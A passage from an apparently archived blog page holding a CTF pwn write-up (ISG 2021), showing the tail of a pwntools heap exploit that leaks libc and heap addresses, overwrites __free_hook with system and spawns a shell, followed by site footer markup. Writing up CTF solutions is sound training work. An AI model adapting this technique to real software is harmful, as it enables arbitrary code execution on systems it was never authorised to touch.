class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1ebc61</span></span><br><span class="line">	log.success(<span class="string">"leak==&gt;"</span>+hex(leak))</span><br><span class="line">	free_hook=leak+libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">	system=leak+libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">	show(<span class="number">2</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"ssage :\x0a"</span>)</span><br><span class="line">	heap=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x561</span></span><br><span class="line">	log.success(<span class="string">"heap==&gt;"</span>+hex(heap))</span><br><span class="line">  </span><br><span class="line">	add(<span class="number">0x40</span>,p64(<span class="number">0x10</span>)+p64(free_hook))<span class="comment">#8</span></span><br><span class="line">	back(p64(heap+<span class="number">0x8a0</span>))</span><br><span class="line">	gdb.attach(io,<span class="string">"b *0x555555554000+0x16f7"</span>)</span><br><span class="line">	edit(<span class="number">-0x7fffffffffffffe0</span>,p64(system))</span><br><span class="line">	add(<span class="number">0x40</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	dele(<span class="number">9</span>)</span><br><span class="line">	io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypwn"><span class="toc-number">1.</span> <span class="toc-text">easypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babypwn"><span class="toc-number">2.</span> <span class="toc-text">babypwn</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2021/09/04/ISG2021_Pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&text=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&is_video=false&description=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISG 2021 “观安杯” Pwn类型题目WriteUp&body=Check out this article: http://startpwn.top/2021/09/04/ISG2021_Pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&name=ISG 2021 “观安杯” Pwn类型题目WriteUp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2021/09/04/ISG2021_Pwn/&t=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2021
+    ssta
+    <a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener" >津ICP备20002899号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
